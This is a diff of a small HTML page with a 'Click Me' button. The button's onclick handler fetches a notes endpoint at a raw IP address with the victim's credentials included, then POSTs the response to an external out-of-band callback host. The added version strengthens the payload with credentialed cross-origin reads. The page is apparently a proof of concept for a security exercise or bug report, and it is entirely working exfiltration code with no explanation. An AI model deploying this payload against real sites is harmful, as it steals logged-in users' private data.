@@ -1,11 +1,15 @@
-<html><body>
-   <button id="installbutton" onclick="
-    fetch('/notes')
-      .then(r => r.text())
-      .then(f => fetch('https://xxznlcbddfawoqusewsswapolo2tye7so.oast.fun', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: f
-      }))
-  ">Click Me</button>
-</body></html>
+<html>
+  <body>
+    <button id="installbutton" onclick="
+      fetch('http://52.47.161.102:3000/notes', {
+        credentials: 'include'
+      })
+        .then(r => r.text())
+        .then(f => fetch('https://xxznlcbddfawoqusewsswapolo2tye7so.oast.fun', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: f
+        }))
+    ">Click Me</button>
+  </body>
+</html>
